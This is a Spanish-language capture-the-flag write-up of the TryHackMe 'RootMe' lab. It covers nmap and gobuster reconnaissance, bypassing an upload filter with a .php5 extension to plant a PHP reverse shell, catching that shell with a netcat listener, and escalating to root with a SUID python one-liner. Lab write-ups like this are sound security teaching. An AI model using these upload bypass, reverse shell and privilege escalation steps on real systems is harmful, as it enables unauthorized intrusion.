---
title:  "RootMe Writeup [ES] - TryHackMe"
date:   2021-04-02 04:00:00 -0400
categories: [THM]
toc: true
comments: false
tags: [privesc]
---

En esta ocasión estaré resolviendo el lab [RootMe](https://www.tryhackme.com/room/rrootme) de la plataforma **TryHackMe**. Esta máquina es bastante sencilla como se verá a continuación.

## Lab info

![Lab Info](/images/THM/RootMe/00-lab-info.png "Machine Info")


## Task 1 - Deploy the machine

Desplegar la máquina, no requiere respuesta.

## Task 2 - Reconnaissance

1 - Scan the machine, how many ports are open?
``` 
2
```
Según el escáner realizado con **nmap**, podemos ver que existen 2 puertos abiertos. Se han utilizado los siguientes comandos:

* ```nmap -p- -sS --min-rate 4000 -n -v 10.10.253.211 -oG allPorts.gnmap```
* ```nmap -sC -sV -p22,80 10.10.253.211 -oN ports.nmap```


```plaintext
Nmap scan report for 10.10.253.211
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2 - What version of Apache is running?
```
2.4.29
```
Esta información se puede visualizar desde el escaner nmap o realizando ```whatweb http://10.10.253.211```

```plaintext
http://10.10.253.211 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.253.211], Script, Title[HackIT - Home]
```
Desde el navegador se visualiza la siguiente home page:

![Web Page](/images/THM/RootMe/05-web-page.png)

3 - What service is running on port 22?
```
SSH
```

4 - Find directories on the web server using the GoBuster tool.
```
No requiere respuesta
```
5 - What is the hidden directory?

```
/panel/
```

Gobuster scan: 

* ```gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.253.211/ -t 300 --no-error```

```plaintext
===============================================================
2021/04/02 19:02:50 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--> http://10.10.253.211/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.253.211/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.253.211/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.253.211/panel/]
```

## Task 3 - Getting a shell

Para esta tarea la plataforma solicita obtener una shell en base a lo que se ha descubierto anteriormente. Para ello revisamos la ruta ```http://10.10.253.211/panel/``` en donde se visualiza un panel para subir archivos.

![Panel](/images/THM/RootMe/10-web-upload-page.png)

Esto nos hace pensar que es posible subir un archivo que nos entable una reverse shell. Para que funcione, debemos saber que lenguaje interpretará la página. Revisando en Wappalyzer vemos que la web está construida en ```php```

![PHP](/images/THM/RootMe/15-web-upload-language.png)

Sabiendo esto, yo recomiendo utilizar el recurso de [Pentest Monkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) para la reverse shell con PHP.

Descargamos el archivo y lo editamos para asegurarnos de definir nuestra IP y Puerto en el que queremos recibir la shell.

![RSHELL](/images/THM/RootMe/20-reverse-shell-php.png)

Probamos a subir el archivo y nos encontramos con el siguiente mensaje:

![Web Error](/images/THM/RootMe/26-web-error.png)

Lo que nos da a entender que la extensión del archivo no es válida.

Para lidiar con esto, lo que se puede hacer es crear múltiples archivos con distinta extensión y probar uno a uno o bien realizar esta comprobación con **BurpSuite** lo cual resulta más cómodo. Recordar que existe un [room](https://www.tryhackme.com/room/rpburpsuite) en la plataforma de TryHackMe donde se puede aprender a utilizar BurpSuite desde cero.

Dicho lo anterior, lo que se debe hacer es interceptar la subida del archivo y analizar la respuesta del lado del servidor hasta que nos dé una respuesta satisfactoria.

Se intercepta la petición realizada por el navegador y posteriormente se envía al repeater. En la izquierda tenemos la petición realizada con un archivo con extensión ```.php``` y en la derecha se visualiza la respuesta indicando que la extensión no es válida.

![Burp Error](/images/THM/RootMe/30-burp-error.png)

Cambiamos la extensión y vemos que la respuesta ahora es satisfactoria. Esta respuesta se obtiene con las extensiones ```.php2``` ```.php3``` ```.php4``` ```.php5```.

![Burp Ok](/images/THM/RootMe/35-burp-ok.png)

En mi caso subiré el archivo como rshell.php5

![Web Ok](/images/THM/RootMe/41-web-ok.png)

Como se aprecia en la imagen, se obtiene una respuesta exitosa y haciendo hovering en el texto señalado se obtiene la ruta del archivo que fue subido. En mi caso la ruta es: ```http://10.10.253.211/uploads/rshell.php5```

Ahora, con netcat abrimos el canal para la escucha tráfico en el puerto 443 que definimos anteriormente.

```bash
nc -nlvp 443
listening on [any] 443 ...
```

Y ejecutamos el archivo en el navegador para obtener una shell con el usuario www-data.

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.13.0.103] from (UNKNOWN) [10.10.253.211] 35932
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:23:22 up  3:44,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```
la flag de este usuario se encuentra en ```/var/www/user.txt```.

```bash
THM{y0u_**********}
```

## Task 4 - Privilege escalation

Para la fase de escalada de privilegios lo primero sería hacer una búsqueda de archivos con permiso SUID habilitado.

```bash
$ find \-perm -4000 2>/dev/null | grep -v "snap"

./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/traceroute6.iputils
./usr/bin/newuidmap
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/python
./usr/bin/at
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/passwd
./usr/bin/pkexec
./bin/mount
./bin/su
./bin/fusermount
./bin/ping
./bin/umount
```

En base a lo obtenido y haciendo uso de la web [GTFObins](https://gtfobins.github.io/), podemos identificar que se puede explotar python para obtener una shell con privilegios elevados. En la sección de SUID nos indican como realizarlo.

![Web Ok](/images/THM/RootMe/45-gtfobins.png)


```bash
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
root
```

Por último se realiza una lectura de la flag ubicada en /root/root.txt

```bash
THM{pr1v1l**********}
```
Eso concluye la última pregunta de este lab.